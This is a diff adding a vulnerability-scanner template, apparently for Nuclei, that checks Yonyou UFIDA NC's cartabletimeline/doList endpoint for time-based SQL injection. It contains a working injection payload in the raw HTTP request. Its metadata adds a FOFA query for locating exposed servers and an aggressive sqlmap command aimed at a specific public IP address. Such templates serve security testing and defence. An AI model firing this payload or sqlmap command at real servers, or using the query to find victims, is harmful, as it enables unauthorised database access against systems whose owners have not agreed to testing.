@@ -1,0 +1,33 @@
+id: yonyou-nc-cartabletimeline-sqli
+info:
+  name: 用友 UFIDA NC cartabletimeline/doList - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BNC-cartabletimeline%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+    sqlmap: sqlmap -u "http://47.114.44.157:8080/portal/pt/cartabletimeline/doList?pageId=login&mtr=1" -p "mtr" --batch --random-agent --risk 3 --level 5 --dbms=Oracle --tamper=space2comment
+  tags: yonyou,oa,nc,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Priority: u=4
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
